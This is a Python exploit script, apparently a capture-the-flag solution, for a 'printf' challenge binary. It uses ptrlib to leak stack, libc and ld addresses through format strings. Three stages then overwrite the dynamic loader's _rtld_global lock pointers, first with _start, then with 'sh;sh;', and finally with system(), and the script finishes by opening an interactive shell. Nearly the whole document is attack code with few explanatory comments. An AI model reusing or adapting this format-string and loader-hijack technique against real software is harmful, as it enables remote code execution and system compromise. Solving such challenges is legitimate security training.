from ptrlib import *

#"""
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-linux-x86-64.so.2")
#sock = Socket("printf.chal.ctf.westerns.tokyo", 10001)
libc = ELF("./my_libc-2.29.so")
ld = ELF("./my_ld-2.29.so")
sock = Socket("localhost", 9999)
delta = 0xeb + 8
dl_load_lock = ld.symbol("_rtld_global") + 2312
rtld_lock_lock_recursive = ld.symbol("_rtld_global") + 3848
ld_offset = 0x1fa000
"""
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
ld = ELF("/lib/x86_64-linux-gnu/ld-2.27.so")
sock = Process("./printf")
delta = 0xe7
dl_load_lock = ld.symbol("_rtld_global") + 2312
rtld_lock_lock_recursive = ld.symbol("_rtld_global") + 3840
ld_offset = 0x3f1000
#"""

## Stage 1
# leak info
sock.recvline()
sock.sendline("%lx.%lx." * 24)
sock.recvline()
x = sock.recvline().split(b".")
addr_stack = int(x[39], 16)
proc_base = int(x[41], 16) - 0x2a40
libc_base = int(x[42], 16) - libc.symbol("__libc_start_main") - delta
ld_base = libc_base + ld_offset
logger.info("stack = " + hex(addr_stack))
logger.info("proc = " + hex(proc_base))
logger.info("libc = " + hex(libc_base))
logger.info("ld = " + hex(ld_base))
# overwrite __rtld_lock_lock_recursive
payload = str2bytes('%{}x'.format(addr_stack - ld_base - rtld_lock_lock_recursive - 0x388))
payload += p64(proc_base + 0x10d0) # _start
sock.recvline()
sock.sendline(payload)
sock.recvline()

## Stage 2
sock.recvline()
sock.sendline("Hello, World!")
sock.recvline()
# overwrite dl_load_lock
payload = str2bytes('%{}x'.format(addr_stack - ld_base - dl_load_lock - 0x388 - 0x190))
payload += b"sh;sh;" # /bin/sh
sock.recvline()
sock.sendline(payload)
sock.recvline()

## Stage 3
sock.recvline()
sock.sendline("Hello, World!")
sock.recvline()
# overwrite __rtld_lock_lock_recursive
payload = str2bytes('%{}x'.format(addr_stack - ld_base - rtld_lock_lock_recursive - 0x388 - 0x190 - 0x190))
payload += p64(libc_base + libc.symbol("system")) # system
sock.recvline()
sock.sendline(payload)
sock.recvline()
sock.recvline()
sock.recvline()

sock.interactive()
